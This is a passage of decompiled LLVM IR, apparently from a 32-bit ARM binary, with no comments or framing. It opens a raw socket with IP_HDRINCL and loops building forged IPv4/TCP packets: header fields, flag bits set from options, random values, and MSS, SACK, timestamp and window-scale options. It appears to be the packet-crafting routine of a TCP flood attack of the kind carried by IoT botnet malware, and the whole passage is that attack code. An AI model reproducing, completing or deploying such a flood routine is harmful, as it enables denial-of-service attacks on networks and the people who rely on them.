  %v0_d7cc = load i32, i32* @r5, align 4
  store i32 %v0_d7cc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r4, align 4
  store i32 %v0_d7dc, i32* %r0.global-to-local, align 4
  %v5_d7e0 = inttoptr i32 %v0_d7cc to i32*
  %v6_d7e0 = call i32 @function_92dc(i32 %v0_d7dc, i32* %v5_d7e0, i32 12, i32 0)
  %v0_d7e4 = load i32, i32* @r5, align 4
  store i32 %v0_d7e4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d7f4 = load i32, i32* @r4, align 4
  store i32 %v0_d7f4, i32* %r0.global-to-local, align 4
  %v5_d7f8 = inttoptr i32 %v0_d7e4 to i32*
  %v6_d7f8 = call i32 @function_92dc(i32 %v0_d7f4, i32* %v5_d7f8, i32 13, i32 0)
  %v0_d7fc = load i32, i32* @r5, align 4
  store i32 %v0_d7fc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d80c = load i32, i32* @r4, align 4
  store i32 %v0_d80c, i32* %r0.global-to-local, align 4
  %v5_d810 = inttoptr i32 %v0_d7fc to i32*
  %v6_d810 = call i32 @function_92dc(i32 %v0_d80c, i32* %v5_d810, i32 14, i32 0)
  %v0_d814 = load i32, i32* @r5, align 4
  store i32 %v0_d814, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d824 = load i32, i32* @r4, align 4
  store i32 %v0_d824, i32* %r0.global-to-local, align 4
  %v5_d828 = inttoptr i32 %v0_d814 to i32*
  %v6_d828 = call i32 @function_92dc(i32 %v0_d824, i32* %v5_d828, i32 15, i32 1)
  %v0_d82c = load i32, i32* @r5, align 4
  store i32 %v0_d82c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d83c = load i32, i32* @r4, align 4
  store i32 %v0_d83c, i32* %r0.global-to-local, align 4
  %v5_d840 = inttoptr i32 %v0_d82c to i32*
  %v6_d840 = call i32 @function_92dc(i32 %v0_d83c, i32* %v5_d840, i32 16, i32 0)
  %v2_d84c = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_d84c, i32* %r3.global-to-local, align 4
  %v0_d850 = load i32, i32* @r5, align 4
  store i32 %v0_d850, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d858 = load i32, i32* @r4, align 4
  store i32 %v0_d858, i32* %r0.global-to-local, align 4
  %v5_d85c = inttoptr i32 %v0_d850 to i32*
  %v6_d85c = call i32 @function_9270(i32 %v0_d858, i32* %v5_d85c, i32 25, i32 %v2_d84c, i32 %v6_d840)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d870 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_d870, i32* %r0.global-to-local, align 4
  %v2_d874 = icmp eq i32 %v3_d870, -1
  store i1 %v2_d874, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d870, i32* %sb.global-to-local, align 4
  br i1 %v2_d874, label %dec_label_pc_dde8, label %dec_label_pc_d880

dec_label_pc_d880:                                ; preds = %dec_label_pc_d6a8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d888 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d888, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d89c = call i32 @setsockopt(i32 0, i32 3, i32 %v6_d888, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_d89c, i32* %r0.global-to-local, align 4
  %v2_d8a0 = icmp eq i32 %v6_d89c, -1
  store i1 %v2_d8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d8a0, label %dec_label_pc_dde0, label %dec_label_pc_d8a8

dec_label_pc_d8a8:                                ; preds = %dec_label_pc_d880
  %v3_d8ac = mul i32 %v7_d704, 65536
  store i32 %v3_d8ac, i32* %r4.global-to-local, align 4
  %v3_d8b0 = urem i32 %v7_d704, 65536
  %v0_d8c0 = load i32, i32* @r7, align 4
  %v3_d8c0 = mul i32 %v0_d8c0, 65536
  store i32 %v3_d8c0, i32* %r0.global-to-local, align 4
  %v0_d8c4 = load i32, i32* @r6, align 4
  %v3_d8c4 = mul i32 %v0_d8c4, 65536
  store i32 %v3_d8c4, i32* %r5.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_d8cc = urem i32 %v0_d8c0, 65536
  store i32 %v3_d8cc, i32* %ip.global-to-local, align 4
  %v3_d8d0 = urem i32 %v0_d8c4, 65536
  store i32 %v3_d8d0, i32* %r2.global-to-local, align 4
  %v1_d8d4 = urem i32 %v6_d7c8, 256
  store i32 %v1_d8d4, i32* %r3.global-to-local, align 4
  %v0_d8d8 = load i32, i32* @sl, align 4
  %v2_d8d8 = icmp eq i32 %v0_d8d8, 0
  store i1 %v2_d8d8, i1* %cpsr_z.global-to-local, align 1
  %tmp70 = icmp slt i32 %v0_d8d8, 1
  br i1 %tmp70, label %dec_label_pc_db8c, label %dec_label_pc_d8ec

dec_label_pc_d8ec:                                ; preds = %dec_label_pc_d8a8
  %v1_d904 = urem i32 %v0_d8c4, 256
  %tmp71 = udiv i32 %v0_d8c0, 256
  %v3_d908 = urem i32 %tmp71, 256
  %v1_d90c = urem i32 %v0_d8c0, 256
  %v4_d910 = mul nuw nsw i32 %v1_d90c, 256
  %v5_d910 = or i32 %v4_d910, %v3_d908
  store i32 %v5_d910, i32* %r7.global-to-local, align 4
  %tmp72 = udiv i32 %v7_d704, 256
  %tmp73 = mul i32 %v5_d798, 256
  %v1_d92c = and i32 %tmp73, 65280
  %v1_d930 = urem i32 %v6_d7c8, 2
  %v3_d934 = mul nuw nsw i32 %v1_d904, 256
  store i32 %v3_d934, i32* %r1.global-to-local, align 4
  %v5_d938 = trunc i32 %tmp72 to i8
  %tmp74 = udiv i32 %v0_d8c4, 256
  %v4_d93c = urem i32 %tmp74, 256
  %v5_d93c = or i32 %v4_d93c, %v3_d934
  store i32 %v5_d93c, i32* %r6.global-to-local, align 4
  %v1_d940 = urem i32 %v6_d7e0, 2
  %v1_d944 = urem i32 %v6_d7f8, 2
  %tmp75 = udiv i32 %v5_d798, 256
  %v4_d948 = urem i32 %tmp75, 256
  %v5_d948 = or i32 %v4_d948, %v1_d92c
  store i32 %v5_d948, i32* %r5.global-to-local, align 4
  %v1_d968 = urem i32 %v6_d810, 2
  %v1_d96c = urem i32 %v6_d828, 2
  %v1_d978 = urem i32 %v6_d840, 2
  store i32 %v1_d978, i32* %r0.global-to-local, align 4
  %v3_d97c = udiv i32 %v7_d704, 65536
  store i32 %v3_d97c, i32* %r2.global-to-local, align 4
  store i32 %v1_d90c, i32* %r3.global-to-local, align 4
  store i32 %v1_d904, i32* %ip.global-to-local, align 4
  %v5_d994 = trunc i32 %v0_d8c4 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext = mul i32 %v6_d71c, 16777216
  %v4_d9e4 = sdiv i32 %sext, 16777216
  %tmp = sub nsw i32 0, %v1_d930
  %v4_da58 = and i32 %tmp, 32
  %tmp79 = sub nsw i32 0, %v1_d940
  %v4_da6c = and i32 %tmp79, 16
  %tmp80 = sub nsw i32 0, %v1_d944
  %v4_da80 = and i32 %tmp80, 8
  %tmp81 = sub nsw i32 0, %v1_d968
  %v4_da94 = and i32 %tmp81, 4
  %tmp82 = sub nsw i32 0, %v1_d96c
  %v3_daa8 = and i32 %tmp82, 2
  %v7_dad8 = sext i8 %v5_d994 to i32
  %sext78 = mul i32 %v0_d8c0, 16777216
  %v3_dad8 = sdiv i32 %sext78, 16777216
  br label %dec_label_pc_d99c

dec_label_pc_d99c:                                ; preds = %bb77, %dec_label_pc_d8ec
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_d9a4 = call i32* @calloc(i32 128, i32 1)
  %v4_d9a4 = ptrtoint i32* %v2_d9a4 to i32
  store i32 %v4_d9a4, i32* %r0.global-to-local, align 4
  %v3_d9a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9a8, i32* %r2.global-to-local, align 4
  %v1_d9ac = load i32, i32* %fp.global-to-local, align 4
  %v2_d9ac = load i32, i32* %r4.global-to-local, align 4
  %v5_d9ac = mul i32 %v2_d9ac, 4
  %v6_d9ac = add i32 %v5_d9ac, %v1_d9ac
  %v7_d9ac = inttoptr i32 %v6_d9ac to i32*
  store i32 %v4_d9a4, i32* %v7_d9ac, align 4
  %v0_d9b0 = load i32, i32* %fp.global-to-local, align 4
  %v1_d9b0 = load i32, i32* %r2.global-to-local, align 4
  %v4_d9b0 = mul i32 %v1_d9b0, 4
  %v5_d9b0 = add i32 %v4_d9b0, %v0_d9b0
  %v6_d9b0 = inttoptr i32 %v5_d9b0 to i32*
  %v7_d9b0 = load i32, i32* %v6_d9b0, align 4
  store i32 %v7_d9b0, i32* %r4.global-to-local, align 4
  %v1_d9b4 = inttoptr i32 %v7_d9b0 to i8*
  %v2_d9b4 = load i8, i8* %v1_d9b4, align 1
  %tmp83 = urem i8 %v2_d9b4, 16
  %v1_d9b8 = zext i8 %tmp83 to i32
  %v1_d9bc = or i32 %v1_d9b8, 64
  store i32 %v1_d9bc, i32* %r3.global-to-local, align 4
  %v1_d9c0 = trunc i32 %v1_d9bc to i8
  store i8 %v1_d9c0, i8* %v1_d9b4, align 1
  %v0_d9c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_d9c4 = inttoptr i32 %v0_d9c4 to i8*
  %v2_d9c4 = load i8, i8* %v1_d9c4, align 1
  %v1_d9c8 = and i8 %v2_d9c4, -16
  %v1_d9cc = or i8 %v1_d9c8, 5
  store i32 %v1_d748, i32* %r0.global-to-local, align 4
  store i8 %v1_d9cc, i8* %v1_d9c4, align 1
  %v2_d9dc = load i32, i32* %r4.global-to-local, align 4
  %v3_d9dc = add i32 %v2_d9dc, 1
  %v4_d9dc = inttoptr i32 %v3_d9dc to i8*
  store i8 %v5_d700, i8* %v4_d9dc, align 1
  store i32 %v4_d9e4, i32* %r2.global-to-local, align 4
  %v2_d9e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d9e8 = add i32 %v2_d9e8, 4
  %v4_d9e8 = inttoptr i32 %v3_d9e8 to i8*
  store i8 %v5_d938, i8* %v4_d9e8, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_d9f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_d9f4 = icmp eq i32 %v0_d9f4, 0
  store i1 %v2_d9f4, i1* %cpsr_z.global-to-local, align 1
  %v2_d9f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d9f8 = add i32 %v2_d9f8, 3
  %v4_d9f8 = inttoptr i32 %v3_d9f8 to i8*
  store i8 60, i8* %v4_d9f8, align 1
  store i32 %v3_d97c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_da04 = load i32, i32* %r2.global-to-local, align 4
  %v1_da04 = trunc i32 %v0_da04 to i8
  %v2_da04 = load i32, i32* %r4.global-to-local, align 4
  %v3_da04 = add i32 %v2_da04, 8
  %v4_da04 = inttoptr i32 %v3_da04 to i8*
  store i8 %v1_da04, i8* %v4_da04, align 1
  %v0_da08 = load i32, i32* %ip.global-to-local, align 4
  %v1_da08 = trunc i32 %v0_da08 to i8
  %v2_da08 = load i32, i32* %r4.global-to-local, align 4
  %v3_da08 = add i32 %v2_da08, 9
  %v4_da08 = inttoptr i32 %v3_da08 to i8*
  store i8 %v1_da08, i8* %v4_da08, align 1
  %v0_da0c = load i32, i32* %r3.global-to-local, align 4
  %v1_da0c = trunc i32 %v0_da0c to i8
  %v2_da0c = load i32, i32* %r4.global-to-local, align 4
  %v3_da0c = add i32 %v2_da0c, 2
  %v4_da0c = inttoptr i32 %v3_da0c to i8*
  store i8 %v1_da0c, i8* %v4_da0c, align 1
  %v3_da10 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da10, i32* %r2.global-to-local, align 4
  %v0_da14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da14, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d99c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_da18 = load i32, i32* %r4.global-to-local, align 4
  %v4_da18 = add i32 %v3_da18, 6
  %v5_da18 = inttoptr i32 %v4_da18 to i8*
  store i8 64, i8* %v5_da18, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d99c, %bb
  %v0_da1c = load i32, i32* %r0.global-to-local, align 4
  %v1_da1c = trunc i32 %v0_da1c to i8
  %v2_da1c = load i32, i32* %r4.global-to-local, align 4
  %v3_da1c = add i32 %v2_da1c, 5
  %v4_da1c = inttoptr i32 %v3_da1c to i8*
  store i8 %v1_da1c, i8* %v4_da1c, align 1
  %v0_da20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da20, label %.thread10, label %bb76

.thread10:                                        ; preds = %.thread
  store i32 %v6_d85c, i32* %r0.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_d85c, i32* %r0.global-to-local, align 4
  %v3_da28 = load i32, i32* %r4.global-to-local, align 4
  %v4_da28 = add i32 %v3_da28, 7
  %v5_da28 = inttoptr i32 %v4_da28 to i8*
  store i8 0, i8* %v5_da28, align 1
  %v0_da30.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %.thread10, %bb76
  %v0_da30 = phi i32 [ %v6_d85c, %.thread10 ], [ %v0_da30.pre, %bb76 ]
  %v0_da2c = load i32, i32* %r2.global-to-local, align 4
  %v3_da2c = mul i32 %v0_da2c, 32
  store i32 %v3_da2c, i32* %r3.global-to-local, align 4
  %v1_da30 = load i32, i32* %r4.global-to-local, align 4
  %v2_da30 = add i32 %v1_da30, 12
  %v3_da30 = inttoptr i32 %v2_da30 to i32*
  store i32 %v0_da30, i32* %v3_da30, align 4
  %v0_da34 = load i32, i32* %r3.global-to-local, align 4
  %v1_da34 = load i32, i32* %r2.global-to-local, align 4
  %tmp84 = mul i32 %v1_da34, -8
  %v5_da34 = add i32 %v0_da34, %tmp84
  %v1_da38 = load i32, i32* @r8, align 4
  %v2_da38 = add i32 %v1_da38, %v5_da34
  store i32 %v2_da38, i32* %r3.global-to-local, align 4
  %v1_da3c = add i32 %v2_da38, 16
  %v2_da3c = inttoptr i32 %v1_da3c to i32*
  %v3_da3c = load i32, i32* %v2_da3c, align 4
  store i32 %v3_da3c, i32* %r2.global-to-local, align 4
  %v0_da40 = load i32, i32* %r7.global-to-local, align 4
  %v1_da40 = trunc i32 %v0_da40 to i8
  %v2_da40 = load i32, i32* %r4.global-to-local, align 4
  %v3_da40 = add i32 %v2_da40, 20
  %v4_da40 = inttoptr i32 %v3_da40 to i8*
  store i8 %v1_da40, i8* %v4_da40, align 1
  %v0_da44 = load i32, i32* %r2.global-to-local, align 4
  %v1_da44 = load i32, i32* %r4.global-to-local, align 4
  %v2_da44 = add i32 %v1_da44, 16
  %v3_da44 = inttoptr i32 %v2_da44 to i32*
  store i32 %v0_da44, i32* %v3_da44, align 4
  %v0_da48 = load i32, i32* %r4.global-to-local, align 4
  %v1_da48 = add i32 %v0_da48, 20
  store i32 %v1_da48, i32* %r1.global-to-local, align 4
  %v1_da4c = add i32 %v0_da48, 33
  %v2_da4c = inttoptr i32 %v1_da4c to i8*
  %v3_da4c = load i8, i8* %v2_da4c, align 1
  %v4_da4c = zext i8 %v3_da4c to i32
  store i32 %v1_d930, i32* %r2.global-to-local, align 4
  %v1_da54 = and i32 %v4_da4c, 223
  %v5_da58 = or i32 %v1_da54, %v4_da58
  store i32 %v5_da58, i32* %r3.global-to-local, align 4
  %v1_da5c = trunc i32 %v5_da58 to i8
  store i8 %v1_da5c, i8* %v2_da4c, align 1
  %v0_da60 = load i32, i32* %r1.global-to-local, align 4
  %v1_da60 = add i32 %v0_da60, 13
  %v2_da60 = inttoptr i32 %v1_da60 to i8*
  %v3_da60 = load i8, i8* %v2_da60, align 1
  %v4_da60 = zext i8 %v3_da60 to i32
  store i32 %v1_d940, i32* %r3.global-to-local, align 4
  %v1_da68 = and i32 %v4_da60, 239
  %v5_da6c = or i32 %v1_da68, %v4_da6c
  store i32 %v5_da6c, i32* %r2.global-to-local, align 4
  %v1_da70 = trunc i32 %v5_da6c to i8
  store i8 %v1_da70, i8* %v2_da60, align 1
  %v0_da74 = load i32, i32* %r1.global-to-local, align 4
  %v1_da74 = add i32 %v0_da74, 13
  %v2_da74 = inttoptr i32 %v1_da74 to i8*
  %v3_da74 = load i8, i8* %v2_da74, align 1
  %v4_da74 = zext i8 %v3_da74 to i32
  store i32 %v1_d944, i32* %ip.global-to-local, align 4
  %v1_da7c = and i32 %v4_da74, 247
  %v5_da80 = or i32 %v1_da7c, %v4_da80
  store i32 %v5_da80, i32* %r3.global-to-local, align 4
  %v1_da84 = trunc i32 %v5_da80 to i8
  store i8 %v1_da84, i8* %v2_da74, align 1
  %v0_da88 = load i32, i32* %r1.global-to-local, align 4
  %v1_da88 = add i32 %v0_da88, 13
  %v2_da88 = inttoptr i32 %v1_da88 to i8*
  %v3_da88 = load i8, i8* %v2_da88, align 1
  %v4_da88 = zext i8 %v3_da88 to i32
  store i32 %v1_d968, i32* %r0.global-to-local, align 4
  %v1_da90 = and i32 %v4_da88, 251
  %v5_da94 = or i32 %v1_da90, %v4_da94
  store i32 %v5_da94, i32* %r2.global-to-local, align 4
  %v1_da98 = trunc i32 %v5_da94 to i8
  store i8 %v1_da98, i8* %v2_da88, align 1
  %v0_da9c = load i32, i32* %r1.global-to-local, align 4
  %v1_da9c = add i32 %v0_da9c, 13
  %v2_da9c = inttoptr i32 %v1_da9c to i8*
  %v3_da9c = load i8, i8* %v2_da9c, align 1
  %v4_da9c = zext i8 %v3_da9c to i32
  store i32 %v1_d96c, i32* %r2.global-to-local, align 4
  %v1_daa4 = and i32 %v4_da9c, 253
  %v4_daa8 = or i32 %v1_daa4, %v3_daa8
  store i32 %v4_daa8, i32* %r3.global-to-local, align 4
  %v1_daac = trunc i32 %v4_daa8 to i8
  store i8 %v1_daac, i8* %v2_da9c, align 1
  %v0_dab0 = load i32, i32* %r1.global-to-local, align 4
  %v1_dab0 = add i32 %v0_dab0, 12
  %v2_dab0 = inttoptr i32 %v1_dab0 to i8*
  %v3_dab0 = load i8, i8* %v2_dab0, align 1
  %v4_dab0 = zext i8 %v3_dab0 to i32
  store i32 %v4_dab0, i32* %r2.global-to-local, align 4
  %v1_dab4 = add i32 %v0_dab0, 13
  %v2_dab4 = inttoptr i32 %v1_dab4 to i8*
  %v3_dab4 = load i8, i8* %v2_dab4, align 1
  %v4_dab4 = zext i8 %v3_dab4 to i32
  %tmp85 = urem i8 %v3_dab0, 16
  %v1_dabc = zext i8 %tmp85 to i32
  %v1_dac0 = and i32 %v4_dab4, 254
  %v2_dac4 = or i32 %v1_dac0, %v1_d978
  %v1_dac8 = or i32 %v1_dabc, 160
  store i32 %v1_dac8, i32* %r2.global-to-local, align 4
  %v1_dacc = trunc i32 %v2_dac4 to i8
  store i8 %v1_dacc, i8* %v2_dab4, align 1
  %v0_dad0 = load i32, i32* %r2.global-to-local, align 4
  %v1_dad0 = trunc i32 %v0_dad0 to i8
  %v2_dad0 = load i32, i32* %r1.global-to-local, align 4
  %v3_dad0 = add i32 %v2_dad0, 12
  %v4_dad0 = inttoptr i32 %v3_dad0 to i8*
  store i8 %v1_dad0, i8* %v4_dad0, align 1
  store i32 %v3_dad8, i32* %r0.global-to-local, align 4
  store i32 %v7_dad8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_dae4 = load i32, i32* %r1.global-to-local, align 4
  %v3_dae4 = add i32 %v2_dae4, 3
  %v4_dae4 = inttoptr i32 %v3_dae4 to i8*
  store i8 %v5_d994, i8* %v4_dae4, align 1
  %v0_dae8 = load i32, i32* %r0.global-to-local, align 4
  %v1_dae8 = trunc i32 %v0_dae8 to i8
  %v2_dae8 = load i32, i32* %r1.global-to-local, align 4
  %v3_dae8 = add i32 %v2_dae8, 1
  %v4_dae8 = inttoptr i32 %v3_dae8 to i8*
  store i8 %v1_dae8, i8* %v4_dae8, align 1
  %v0_daec = load i32, i32* %r6.global-to-local, align 4
  %v1_daec = trunc i32 %v0_daec to i8
  %v2_daec = load i32, i32* %r1.global-to-local, align 4
  %v3_daec = add i32 %v2_daec, 2
  %v4_daec = inttoptr i32 %v3_daec to i8*
  store i8 %v1_daec, i8* %v4_daec, align 1
  %v0_daf0 = load i32, i32* %r5.global-to-local, align 4
  %v1_daf0 = load i32, i32* %r1.global-to-local, align 4
  %v2_daf0 = add i32 %v1_daf0, 4
  %v3_daf0 = inttoptr i32 %v2_daf0 to i32*
  store i32 %v0_daf0, i32* %v3_daf0, align 4
  %v0_daf4 = load i32, i32* %ip.global-to-local, align 4
  %v1_daf4 = trunc i32 %v0_daf4 to i8
  %v2_daf4 = load i32, i32* %r4.global-to-local, align 4
  %v3_daf4 = add i32 %v2_daf4, 41
  %v4_daf4 = inttoptr i32 %v3_daf4 to i8*
  store i8 %v1_daf4, i8* %v4_daf4, align 1
  %v0_daf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_daf8 = trunc i32 %v0_daf8 to i8
  %v2_daf8 = load i32, i32* %r4.global-to-local, align 4
  %v3_daf8 = add i32 %v2_daf8, 40
  %v4_daf8 = inttoptr i32 %v3_daf8 to i8*
  store i8 %v1_daf8, i8* %v4_daf8, align 1
  %v0_dafc = call i32 @function_f67c()
  %v1_db00 = mul i32 %v0_dafc, 256
  %v1_db04 = and i32 %v1_db00, 3840
  %v1_db08 = or i32 %v1_db04, 28672
  %v3_db10 = add nuw nsw i32 %v1_db08, 2048
  %v3_db1c8 = udiv i32 %v3_db10, 256
  store i32 %v3_db1c8, i32* %r1.global-to-local, align 4
  %v0_db20 = load i32, i32* %r4.global-to-local, align 4
  %v1_db20 = add i32 %v0_db20, 42
  store i32 %v1_db20, i32* %r2.global-to-local, align 4
  %v4_db24 = inttoptr i32 %v1_db20 to i8*
  store i8 5, i8* %v4_db24, align 1
  %v0_db28 = load i32, i32* %r1.global-to-local, align 4
  %v1_db28 = trunc i32 %v0_db28 to i8
  %v2_db28 = load i32, i32* %r2.global-to-local, align 4
  %v3_db28 = add i32 %v2_db28, 1
  %v4_db28 = inttoptr i32 %v3_db28 to i8*
  store i8 %v1_db28, i8* %v4_db28, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_db34 = load i32, i32* %r4.global-to-local, align 4
  %v3_db34 = add i32 %v2_db34, 47
  %v4_db34 = inttoptr i32 %v3_db34 to i8*
  store i8 10, i8* %v4_db34, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_db40 = load i32, i32* %r3.global-to-local, align 4
  %v1_db40 = trunc i32 %v0_db40 to i8
  %v2_db40 = load i32, i32* %r4.global-to-local, align 4
  %v3_db40 = add i32 %v2_db40, 46
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v1_db40, i8* %v4_db40, align 1
  %v0_db44 = load i32, i32* %r2.global-to-local, align 4
  %v1_db44 = trunc i32 %v0_db44 to i8
  %v2_db44 = load i32, i32* %r4.global-to-local, align 4
  %v3_db44 = add i32 %v2_db44, 45
  %v4_db44 = inttoptr i32 %v3_db44 to i8*
  store i8 %v1_db44, i8* %v4_db44, align 1
  %v0_db48 = load i32, i32* %r0.global-to-local, align 4
  %v1_db48 = trunc i32 %v0_db48 to i8
  %v2_db48 = load i32, i32* %r4.global-to-local, align 4
  %v3_db48 = add i32 %v2_db48, 44
  %v4_db48 = inttoptr i32 %v3_db48 to i8*
  store i8 %v1_db48, i8* %v4_db48, align 1
  %v0_db4c = call i32 @function_f67c()
  store i32 %v0_db4c, i32* %r0.global-to-local, align 4
  %v2_db54 = load i32, i32* %r4.global-to-local, align 4
  %v3_db54 = add i32 %v2_db54, 56
  %v4_db54 = inttoptr i32 %v3_db54 to i8*
  store i8 1, i8* %v4_db54, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_db64 = load i32, i32* %r4.global-to-local, align 4
  %v2_db64 = add i32 %v1_db64, 48
  %v3_db64 = inttoptr i32 %v2_db64 to i32*
  store i32 %v0_db4c, i32* %v3_db64, align 4
  %v0_db68 = load i32, i32* %r2.global-to-local, align 4
  %v1_db68 = trunc i32 %v0_db68 to i8
  %v2_db68 = load i32, i32* %r4.global-to-local, align 4
  %v3_db68 = add i32 %v2_db68, 58
  %v4_db68 = inttoptr i32 %v3_db68 to i8*
  store i8 %v1_db68, i8* %v4_db68, align 1
  %v0_db6c = load i32, i32* %r3.global-to-local, align 4
  %v1_db6c = trunc i32 %v0_db6c to i8
  %v2_db6c = load i32, i32* %r4.global-to-local, align 4
  %v3_db6c = add i32 %v2_db6c, 59
  %v4_db6c = inttoptr i32 %v3_db6c to i8*
  store i8 %v1_db6c, i8* %v4_db6c, align 1
  %v0_db70 = load i32, i32* %ip.global-to-local, align 4
  %v1_db70 = load i32, i32* %r4.global-to-local, align 4
  %v2_db70 = add i32 %v1_db70, 52
  %v3_db70 = inttoptr i32 %v2_db70 to i32*
  store i32 %v0_db70, i32* %v3_db70, align 4
  %v0_db74 = load i32, i32* %r2.global-to-local, align 4
  %v1_db74 = trunc i32 %v0_db74 to i8
  %v2_db74 = load i32, i32* %r4.global-to-local, align 4
  %v3_db74 = add i32 %v2_db74, 57
  %v4_db74 = inttoptr i32 %v3_db74 to i8*
  store i8 %v1_db74, i8* %v4_db74, align 1
  %v3_db78 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_db78, i32* %r3.global-to-local, align 4
  %v1_db7c = add i32 %v3_db78, 1
  store i32 %v1_db7c, i32* %r4.global-to-local, align 4
  %v0_db80 = load i32, i32* @sl, align 4
  %v9_db80 = icmp eq i32 %v0_db80, %v1_db7c
  store i1 %v9_db80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_db7c, i32* %stack_var_-40, align 4
  %v8_db88 = icmp sgt i32 %v0_db80, %v1_db7c
  br i1 %v8_db88, label %dec_label_pc_d99c, label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %bb77, %dec_label_pc_d8a8
  %v0_db8c = phi i32 [ %v0_d8d8, %dec_label_pc_d8a8 ], [ %v0_db80, %bb77 ]
  %v2_db8c = icmp eq i32 %v0_db8c, 0
  store i1 %v2_db8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_dd44 = icmp eq i32 %v3_d8b0, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_ddc0 = icmp eq i32 %v1_d8d4, 0
  %v2_dbc8 = icmp eq i32 %v6_d85c, -1
  br label %dec_label_pc_db94.outer

dec_label_pc_db94.outer:                          ; preds = %dec_label_pc_dcc0, %dec_label_pc_db8c
  %v1_db94.ph.in = phi i32 [ %v1_dcb4, %dec_label_pc_dcc0 ], [ %v0_db8c, %dec_label_pc_db8c ]
  %v0_db94.ph = phi i1 [ %v2_dcc0, %dec_label_pc_dcc0 ], [ %v2_db8c, %dec_label_pc_db8c ]
  %v1_db94.ph = icmp slt i32 %v1_db94.ph.in, 0
  %v4_db94 = or i1 %v1_db94.ph, %v0_db94.ph
  br label %dec_label_pc_db94

dec_label_pc_db94:                                ; preds = %dec_label_pc_db94.outer, %dec_label_pc_db94
  br i1 %v4_db94, label %dec_label_pc_db94, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db94
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dba4

dec_label_pc_dba4:                                ; preds = %dec_label_pc_dc20, %dec_label_pc_db98
  %v1_dbb4 = phi i32 [ %v1_dcb0, %dec_label_pc_dc20 ], [ 0, %dec_label_pc_db98 ]
  %v5_dba8 = mul i32 %v1_dbb4, 24
  %v1_dbac = load i32, i32* @r8, align 4
  %v2_dbac = add i32 %v1_dbac, %v5_dba8
  store i32 %v2_dbac, i32* %r3.global-to-local, align 4
  %v1_dbb0 = add i32 %v2_dbac, 20
  %v2_dbb0 = inttoptr i32 %v1_dbb0 to i8*
  %v3_dbb0 = load i8, i8* %v2_dbb0, align 1
  %v4_dbb0 = zext i8 %v3_dbb0 to i32
  store i32 %v4_dbb0, i32* %r2.global-to-local, align 4
  %v0_dbb4 = load i32, i32* %fp.global-to-local, align 4
  %v4_dbb4 = mul i32 %v1_dbb4, 4
  %v5_dbb4 = add i32 %v0_dbb4, %v4_dbb4
  %v6_dbb4 = inttoptr i32 %v5_dbb4 to i32*
  %v7_dbb4 = load i32, i32* %v6_dbb4, align 4
  store i32 %v7_dbb4, i32* @r5, align 4
  %v7_dbb8 = icmp eq i8 %v3_dbb0, 31
